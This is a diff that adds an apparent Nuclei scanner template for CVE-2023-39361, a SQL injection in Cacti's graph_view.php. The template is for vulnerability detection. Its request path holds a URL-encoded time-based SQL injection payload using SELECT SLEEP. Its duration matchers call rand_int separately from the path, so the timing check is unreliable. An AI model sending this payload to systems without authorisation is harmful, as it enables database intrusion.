@@ -1,0 +1,22 @@
+id: cacti-graph-view-php-sqli
+info:
+  name: Cacti graph_view.php SQL Injection Vulnerability (CVE-2023-39361)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-39361,sqli
+http:
+  - method: GET
+    path:
+      - "/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%28{{rand_int(5,10)}}%29%3B--+-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "cacti"
+      - type: dsl
+        dsl:
+          - "duration >= rand_int(5,10)"
+          - "duration < rand_int(5,10)+1"
